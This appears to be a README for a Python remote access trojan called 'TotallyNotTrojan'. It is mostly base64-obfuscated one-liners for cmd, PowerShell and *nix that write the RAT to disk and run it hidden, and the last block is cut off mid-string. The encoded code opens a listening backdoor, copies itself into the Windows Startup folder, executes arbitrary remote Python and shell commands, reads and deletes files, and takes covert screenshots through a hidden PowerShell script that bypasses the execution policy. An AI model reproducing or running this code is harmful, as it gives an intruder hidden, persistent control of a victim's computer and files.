# TotallyNotTrojan
TotallyNotTrojan is a RAT written on Python. Works mostly with Windows PCs, but Client-side works also with *nix-systems.

[Linux troll youtube opener script](virinf.md)

# Cmd start
```
echo import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE2LkxJTUEgKFBlcmZtb24gc2NyZWVuc2hvdHRlci1GSVhFRCkgQjY0IEVOQyIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZikuZW5jb2RlKCJ1dGYtOCIpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQpkZWYgcGVyZm9ybV9zY3JlZW5jYXAoKToKICAgIHBheWxvYWQgPSAnJycKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwokaW1hZ2UgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcCgyMDAwLCAxNTAwKQokZ3JhcGhpYyA9IFtTeXN0ZW0uRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkaW1hZ2UpCiRwb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMCwgMCkKJGdyYXBoaWMuQ29weUZyb21TY3JlZW4oJHBvaW50LCAkcG9pbnQsICRpbWFnZS5TaXplKTsKJGN1cnNvckJvdW5kcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUmVjdGFuZ2xlKFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5DdXJzb3JdOjpQb3NpdGlvbiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkN1cnNvcl06OkN1cnJlbnQuU2l6ZSkKW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkN1cnNvcnNdOjpEZWZhdWx0LkRyYXcoJGdyYXBoaWMsICRjdXJzb3JCb3VuZHMpCiRpbWFnZS5TYXZlKCJyZXN1bHQucG5nIiwgW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXRdOjpQbmcpCicnJwogICAgd2l0aCBvcGVuKCJzY3IucHMxIiwgInciKSBhcyBwYXlsb2FkX3NjcmVlbmNhcGVyOgogICAgICAgIHBheWxvYWRfc2NyZWVuY2FwZXIud3JpdGUocGF5bG9hZCkKICAgICAgICBwYXlsb2FkX3NjcmVlbmNhcGVyLmNsb3NlKCkKICAgIGltcG9ydCBvcwogICAgYXR0YWNrID0gInBvd2Vyc2hlbGwgLXdpbiBoaWRkZW4gLW5vbmkgLW5vcCAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAuL3Njci5wczEiCiAgICBpbml0aWFsaXplcl9wID0gJycnCmNvbW1hbmQgPSAiJycnK2F0dGFjaysnJyciCnNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpCnNoZWxsLlJ1biBjb21tYW5kLDAsIGZhbHNlCicnJwogICAgd2l0aCBvcGVuKCJzY3IudmJzIiwgInciKSBhcyBpbml0aWFsaXplcjoKICAgICAgICBpbml0aWFsaXplci53cml0ZShpbml0aWFsaXplcl9wKQogICAgICAgIGluaXRpYWxpemVyLmNsb3NlKCkKICAgIG9zLnBvcGVuKCJzY3IudmJzIikKICAgIHRpbWUuc2xlZXAoNSkKICAgIGRhdGEgPSBvcGVuKCJyZXN1bHQucG5nIiwgInJiIikucmVhZCgpCiAgICBvcy5yZW1vdmUoInNjci52YnMiKQogICAgb3MucmVtb3ZlKCJzY3IucHMxIikKICAgIG9zLnJlbW92ZSgicmVzdWx0LnBuZyIpCiAgICBjb25uLnNlbmQoc3RyKGxlbihkYXRhKSkuZW5jb2RlKCJ1dGYtOCIpKQogICAgY29ubi5zZW5kKGRhdGEpCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gc29jay5hY2NlcHQoKQogICAgZGF0YSA9IGNvbm4ucmVjdigxNjM4NCkKICAgIHVkYXRhID0gZGF0YS5kZWNvZGUoInV0Zi04IikKICAgIGlmIHVkYXRhID09ICJ1cGRhdGUiOnVwdG9kYXRlKCkKICAgIGlmIHVkYXRhID09ICJleGVjcHkiOgogICAgICAgIHB5Y29tbWYgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgcHljb21tID0gcHljb21tZi5kZWNvZGUoInV0Zi04IikKICAgICAgICBleGVjcHkoKQogICAgaWYgdWRhdGEgPT0gImZ1biI6ZnVuKCkKICAgIGlmIHVkYXRhID09ICJuaWNlIjpuaWNlKCkKICAgIGlmIHVkYXRhID09ICJta2RpciI6CiAgICAgICAgZm9sZGVydG9jcmVhdGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZm9sZGVydG9jcmVhdGVkZWMgPSBmb2xkZXJ0b2NyZWF0ZS5kZWNvZGUoInV0Zi04IikKICAgICAgICBkaXJlY3RvcnkoKQogICAgaWYgdWRhdGEgPT0gImZpbGUiOgogICAgICAgIGFib3V0ZmlsZSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmaWxlZGF0YSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmaWxlZGF0YWRlYyA9IGZpbGVkYXRhLmRlY29kZSgidXRmLTgiKQogICAgICAgIGZpbGVzKCkKICAgIGlmIHVkYXRhID09ICJybWRpciI6CiAgICAgICAgZm9sZHRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGR0b3JlbWRlYyA9IGZvbGR0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmVmbGQoKQogICAgaWYgdWRhdGEgPT0gInJtIjoKICAgICAgICBmaWxldG9yZW0gPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZXRvcmVtZGVjID0gZmlsZXRvcmVtLmRlY29kZSgidXRmLTgiKQogICAgICAgIHJlbW92ZSgpCiAgICBpZiB1ZGF0YSA9PSAibWVzc2FnZSI6CiAgICAgICAgbWVzc2FnZWYgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICB0aXRsZWYgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICBtZXNzYWdlID0gbWVzc2FnZWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgdGl0bGUgPSB0aXRsZWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgbWVzcygpCiAgICBpZiB1ZGF0YSA9PSAidGFsayI6CiAgICAgICAgdGV4dHRvdGFsa2YgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICB0ZXh0dG90YWxrID0gdGV4dHRvdGFsa2YuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgdGFsaygpCiAgICBpZiB1ZGF0YSA9PSAibHMiOmxzKCkKICAgIGlmIHVkYXRhID09ICJzZWxmdGVzdCI6c2VsZnRlc3QoKQogICAgaWYgdWRhdGEgPT0gInNoZWxsIjpwcm9tcHQoY29ubi5yZWN2KDE2Mzg0KS5kZWNvZGUoInV0Zi04IikpCiAgICBpZiB1ZGF0YSA9PSAiY2Rqb2tlIjpjZGpva2UoKQogICAgaWYgdWRhdGEgPT0gImNhdCI6CiAgICAgICAgY2F0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gInNjcmVlbnNob3QiOgogICAgICAgIHBlcmZvcm1fc2NyZWVuY2FwKCkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk=')) > tnt.pyw && pythonw tnt.pyw && cls && ipconfig
```
# Powershell startup
```
cmd /c "echo import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIDE2LkxJTUEgKFBlcmZtb24gc2NyZWVuc2hvdHRlci1GSVhFRCkgQjY0IEVOQyIKc29jayA9IHNvY2tldC5zb2NrZXQoKTtzb2NrLmJpbmQoKCIiLCA5MDgxKSk7c29jay5saXN0ZW4oMTApCmltcG9ydCBzeXMsIGdldHBhc3MKYm9vdCA9ICJDOi9Vc2Vycy8iK2dldHBhc3MuZ2V0dXNlcigpKyIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9Ub3RhbGx5Tm90VHJvamFuLnB5dyIKaWYgc3lzLmFyZ3ZbMF0gIT0gYm9vdDoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2h1dGlsCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKHN5cy5hcmd2WzBdLCBib290KQogICAgICAgIG9zLnJlbW92ZShzeXMuYXJndlswXSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCmRlZiB1cHRvZGF0ZSgpOgogICAgZGF0YSA9IGNvbm4ucmVjdigxMDAwMDAwKS5kZWNvZGUoInV0Zi04IikKICAgIHdpdGggb3BlbigiVG90YWxseU5vdFRyb2phbi5weXciLCAidyIpIGFzIGY6CiAgICAgICAgZi53cml0ZShkYXRhKQogICAgICAgIGYuY2xvc2UoKQpkZWYgc2VsZnRlc3QoKTpjb25uLnNlbmQoVkVSU0lPTi5lbmNvZGUoInV0Zi04IikpCmRlZiBleGVjcHkoKTpleGVjKHB5Y29tbSkKZGVmIHRhbGsoKToKICAgIHRyeToKICAgICAgICB0YWxrZmlsZSA9IG9wZW4oIjEudmJzIiwgInciKQogICAgICAgIHRhbGtmaWxlLndyaXRlKCJzZXQgc2FwaT1DcmVhdGVPYmplY3QoXCJzYXBpLnNwdm9pY2VcIikgXG4gc2FwaS5zcGVhayBcIiIrdGV4dHRvdGFsaysiXCIiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgbWVzcygpOmN0eXBlcy53aW5kbGwudXNlcjMyLk1lc3NhZ2VCb3hXKDAsIG1lc3NhZ2UsIHRpdGxlLCAwKQpkZWYgbmljZSgpOgogICAgdHJ5OgogICAgICAgIGQgPSByYW5kaW50KDEsIDQpCiAgICAgICAgaWYgZCA9PSAxOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9SaWJib25zLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAyOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9CdWJibGVzLnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSAzOm9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9NeXN0aWZ5LnNjciAtcyIpCiAgICAgICAgaWYgZCA9PSA0Om9zLnN5c3RlbSgiQzovV2luZG93cy9TeXN0ZW0zMi9zc1RleHQzZC5zY3IgLXMiKQogICAgZXhjZXB0OnBhc3MKZGVmIGRpcmVjdG9yeSgpOgogICAgdHJ5Om9zLm1rZGlyKGZvbGRlcnRvY3JlYXRlZGVjKQogICAgZXhjZXB0OnBhc3MKZGVmIGNkam9rZSgpOgogICAgdHJ5OgogICAgICAgIHRhbGtmaWxlID0gb3BlbigiMS52YnMiLCAidyIpCiAgICAgICAgdGFsa2ZpbGUud3JpdGUoIlNldCBvYmpXTVAgPSBDcmVhdGVPYmplY3QoXCJXTVBsYXllci5PQ1guN1wiKVxuU2V0IGNvbENEcyA9IG9ialdNUC5jZHJvbUNvbGxlY3Rpb25cbmNvbENEcy5JdGVtKDApLkVqZWN0XG5Nc2dCb3ggXCJQcmVzcyBhbnkga2V5IHRvIGNsb3NlIENEXCIsNjQsXCJPcGVuIENsb3NlIENkIFRyYXlcIlxuY29sQ0RzLkl0ZW0oMCkuRWplY3QiKQogICAgICAgIHRhbGtmaWxlLmNsb3NlKCkKICAgICAgICBvcy5zeXN0ZW0oInN0YXJ0IDEudmJzIik7dGltZS5zbGVlcCgxKTtvcy5zeXN0ZW0oImRlbCAxLnZicyIpCiAgICBleGNlcHQ6cGFzcwpkZWYgZnVuKCk6b3MucG9wZW4oImV4cGxvcmVyIGh0dHBzOi8veW91dHViZS5jb20iKQpkZWYgZmlsZXMoKToKICAgIHRyeToKICAgICAgICBmaWxlcyA9IG9wZW4oYWJvdXRmaWxlLCAidyIpCiAgICAgICAgZmlsZXMud3JpdGUoZmlsZWRhdGFkZWMpCiAgICAgICAgZmlsZXMuY2xvc2UoKQogICAgZXhjZXB0OnBhc3MKZGVmIHByb21wdChhcmcpOm9zLnBvcGVuKGFyZykKZGVmIHJlbW92ZWZsZCgpOgogICAgdHJ5Om9zLnJtZGlyKGZvbGR0b3JlbWRlYykKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpwYXNzCmRlZiByZW1vdmUoKToKICAgIHRyeTpvcy5yZW1vdmUoZmlsZXRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIGxzKCk6CiAgICB0cnk6CiAgICAgICAgcGF0aCA9IGNvbm4ucmVjdigxMDAwNSkuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgaWYgcGF0aCAhPSBOb25lIGFuZCBwYXRoICE9ICIiOgogICAgICAgICAgICBmbHNmID0gb3MubGlzdGRpcihwYXRoKQogICAgICAgICAgICBmbHMgPSBzdHIoZmxzZikuZW5jb2RlKCJ1dGYtOCIpCiAgICAgICAgICAgIGNvbm4uc2VuZChmbHMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6IHBhc3MKZGVmIGNhdChmbCk6CiAgICB3aXRoIG9wZW4oZmwsICJyYiIpIGFzIGY6CiAgICAgICAgY29ubi5zZW5kKGYucmVhZCgpKQogICAgICAgIGYuY2xvc2UoKQpkZWYgcGVyZm9ybV9zY3JlZW5jYXAoKToKICAgIHBheWxvYWQgPSAnJycKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwokaW1hZ2UgPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLkJpdG1hcCgyMDAwLCAxNTAwKQokZ3JhcGhpYyA9IFtTeXN0ZW0uRHJhd2luZy5HcmFwaGljc106OkZyb21JbWFnZSgkaW1hZ2UpCiRwb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoMCwgMCkKJGdyYXBoaWMuQ29weUZyb21TY3JlZW4oJHBvaW50LCAkcG9pbnQsICRpbWFnZS5TaXplKTsKJGN1cnNvckJvdW5kcyA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUmVjdGFuZ2xlKFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5DdXJzb3JdOjpQb3NpdGlvbiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkN1cnNvcl06OkN1cnJlbnQuU2l6ZSkKW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkN1cnNvcnNdOjpEZWZhdWx0LkRyYXcoJGdyYXBoaWMsICRjdXJzb3JCb3VuZHMpCiRpbWFnZS5TYXZlKCJyZXN1bHQucG5nIiwgW1N5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXRdOjpQbmcpCicnJwogICAgd2l0aCBvcGVuKCJzY3IucHMxIiwgInciKSBhcyBwYXlsb2FkX3NjcmVlbmNhcGVyOgogICAgICAgIHBheWxvYWRfc2NyZWVuY2FwZXIud3JpdGUocGF5bG9hZCkKICAgICAgICBwYXlsb2FkX3NjcmVlbmNhcGVyLmNsb3NlKCkKICAgIGltcG9ydCBvcwogICAgYXR0YWNrID0gInBvd2Vyc2hlbGwgLXdpbiBoaWRkZW4gLW5vbmkgLW5vcCAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAuL3Njci5wczEiCiAgICBpbml0aWFsaXplcl9wID0gJycnCmNvbW1hbmQgPSAiJycnK2F0dGFjaysnJyciCnNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpCnNoZWxsLlJ1biBjb21tYW5kLDAsIGZhbHNlCicnJwogICAgd2l0aCBvcGVuKCJzY3IudmJzIiwgInciKSBhcyBpbml0aWFsaXplcjoKICAgICAgICBpbml0aWFsaXplci53cml0ZShpbml0aWFsaXplcl9wKQogICAgICAgIGluaXRpYWxpemVyLmNsb3NlKCkKICAgIG9zLnBvcGVuKCJzY3IudmJzIikKICAgIHRpbWUuc2xlZXAoNSkKICAgIGRhdGEgPSBvcGVuKCJyZXN1bHQucG5nIiwgInJiIikucmVhZCgpCiAgICBvcy5yZW1vdmUoInNjci52YnMiKQogICAgb3MucmVtb3ZlKCJzY3IucHMxIikKICAgIG9zLnJlbW92ZSgicmVzdWx0LnBuZyIpCiAgICBjb25uLnNlbmQoc3RyKGxlbihkYXRhKSkuZW5jb2RlKCJ1dGYtOCIpKQogICAgY29ubi5zZW5kKGRhdGEpCndoaWxlIFRydWU6CiAgICBjb25uLCBhZGRyID0gc29jay5hY2NlcHQoKQogICAgZGF0YSA9IGNvbm4ucmVjdigxNjM4NCkKICAgIHVkYXRhID0gZGF0YS5kZWNvZGUoInV0Zi04IikKICAgIGlmIHVkYXRhID09ICJ1cGRhdGUiOnVwdG9kYXRlKCkKICAgIGlmIHVkYXRhID09ICJleGVjcHkiOgogICAgICAgIHB5Y29tbWYgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgcHljb21tID0gcHljb21tZi5kZWNvZGUoInV0Zi04IikKICAgICAgICBleGVjcHkoKQogICAgaWYgdWRhdGEgPT0gImZ1biI6ZnVuKCkKICAgIGlmIHVkYXRhID09ICJuaWNlIjpuaWNlKCkKICAgIGlmIHVkYXRhID09ICJta2RpciI6CiAgICAgICAgZm9sZGVydG9jcmVhdGUgPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZm9sZGVydG9jcmVhdGVkZWMgPSBmb2xkZXJ0b2NyZWF0ZS5kZWNvZGUoInV0Zi04IikKICAgICAgICBkaXJlY3RvcnkoKQogICAgaWYgdWRhdGEgPT0gImZpbGUiOgogICAgICAgIGFib3V0ZmlsZSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmaWxlZGF0YSA9IGNvbm4ucmVjdigxNjM4NCkKICAgICAgICBmaWxlZGF0YWRlYyA9IGZpbGVkYXRhLmRlY29kZSgidXRmLTgiKQogICAgICAgIGZpbGVzKCkKICAgIGlmIHVkYXRhID09ICJybWRpciI6CiAgICAgICAgZm9sZHRvcmVtID0gY29ubi5yZWN2KDE2Mzg0KQogICAgICAgIGZvbGR0b3JlbWRlYyA9IGZvbGR0b3JlbS5kZWNvZGUoInV0Zi04IikKICAgICAgICByZW1vdmVmbGQoKQogICAgaWYgdWRhdGEgPT0gInJtIjoKICAgICAgICBmaWxldG9yZW0gPSBjb25uLnJlY3YoMTYzODQpCiAgICAgICAgZmlsZXRvcmVtZGVjID0gZmlsZXRvcmVtLmRlY29kZSgidXRmLTgiKQogICAgICAgIHJlbW92ZSgpCiAgICBpZiB1ZGF0YSA9PSAibWVzc2FnZSI6CiAgICAgICAgbWVzc2FnZWYgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICB0aXRsZWYgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICBtZXNzYWdlID0gbWVzc2FnZWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgdGl0bGUgPSB0aXRsZWYuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgbWVzcygpCiAgICBpZiB1ZGF0YSA9PSAidGFsayI6CiAgICAgICAgdGV4dHRvdGFsa2YgPSBjb25uLnJlY3YoMTYwMCkKICAgICAgICB0ZXh0dG90YWxrID0gdGV4dHRvdGFsa2YuZGVjb2RlKCJ1dGYtOCIpCiAgICAgICAgdGFsaygpCiAgICBpZiB1ZGF0YSA9PSAibHMiOmxzKCkKICAgIGlmIHVkYXRhID09ICJzZWxmdGVzdCI6c2VsZnRlc3QoKQogICAgaWYgdWRhdGEgPT0gInNoZWxsIjpwcm9tcHQoY29ubi5yZWN2KDE2Mzg0KS5kZWNvZGUoInV0Zi04IikpCiAgICBpZiB1ZGF0YSA9PSAiY2Rqb2tlIjpjZGpva2UoKQogICAgaWYgdWRhdGEgPT0gImNhdCI6CiAgICAgICAgY2F0KGNvbm4ucmVjdigxNjM4NCkuZGVjb2RlKCJ1dGYtOCIpKQogICAgaWYgdWRhdGEgPT0gInNjcmVlbnNob3QiOgogICAgICAgIHBlcmZvcm1fc2NyZWVuY2FwKCkKICAgIGVsc2U6cGFzcztjb25uLmNsb3NlKCk=')) > tnt.pyw && pythonw tnt.pyw && exit"; exit
```
# *-nix limited safe
```
python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgb3MsIHRpbWUsIGN0eXBlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludDtWRVJTSU9OID0gIkJVSUxEIE5JWEVESVRJT04tQjY0IEVOQyAoTGltaXRlZCkiCnNvY2sgPSBzb2NrZXQuc29ja2V0KCk7c29jay5iaW5kKCgiIiwgOTA4MSkpO3NvY2subGlzdGVuKDEwKQppbXBvcnQgc3lzLCBnZXRwYXNzCmJvb3QgPSAiQzovVXNlcnMvIitnZXRwYXNzLmdldHVzZXIoKSsiL0FwcERhdGEvUm9hbWluZy9NaWNyb3NvZnQvV2luZG93cy9TdGFydCBNZW51L1Byb2dyYW1zL1N0YXJ0dXAvVG90YWxseU5vdFRyb2phbi5weXciCmlmIHN5cy5hcmd2WzBdICE9IGJvb3Q6CiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHNodXRpbAogICAgICAgIHNodXRpbC5jb3B5ZmlsZShzeXMuYXJndlswXSwgYm9vdCkKICAgICAgICBvcy5yZW1vdmUoc3lzLmFyZ3ZbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwpkZWYgdXB0b2RhdGUoKToKICAgIGRhdGEgPSBjb25uLnJlY3YoMTAwMDAwMCkuZGVjb2RlKCJ1dGYtOCIpCiAgICB3aXRoIG9wZW4oIlRvdGFsbHlOb3RUcm9qYW4ucHl3IiwgInciKSBhcyBmOgogICAgICAgIGYud3JpdGUoZGF0YSkKICAgICAgICBmLmNsb3NlKCkKZGVmIHNlbGZ0ZXN0KCk6Y29ubi5zZW5kKFZFUlNJT04uZW5jb2RlKCJ1dGYtOCIpKQpkZWYgZXhlY3B5KCk6ZXhlYyhweWNvbW0pCmRlZiBkaXJlY3RvcnkoKToKICAgIHRyeTpvcy5ta2Rpcihmb2xkZXJ0b2NyZWF0ZWRlYykKICAgIGV4Y2VwdDpwYXNzCmRlZiBmaWxlcygpOgogICAgdHJ5OgogICAgICAgIGZpbGVzID0gb3BlbihhYm91dGZpbGUsICJ3IikKICAgICAgICBmaWxlcy53cml0ZShmaWxlZGF0YWRlYykKICAgICAgICBmaWxlcy5jbG9zZSgpCiAgICBleGNlcHQ6cGFzcwpkZWYgcHJvbXB0KGFyZyk6b3MucG9wZW4oYXJnKQpkZWYgcmVtb3ZlZmxkKCk6CiAgICB0cnk6b3Mucm1kaXIoZm9sZHRvcmVtZGVjKQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOnBhc3MKZGVmIHJlbW92ZSgpOgogICAgdHJ5Om9zLnJlbW92ZShmaWxldG9yZW1kZWMpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6cGFzcwpkZWYgbHMoKToKICAgIHRyeToKICAgICAgICBwYXRoID0gY29ubi5yZWN2KDEwMDA1KS5kZWNvZGUoInV0Zi04IikKICAgICAgICBpZiBwYXRoICE9IE5vbmUgYW5kIHBhdGggIT0gIiI6CiAgICAg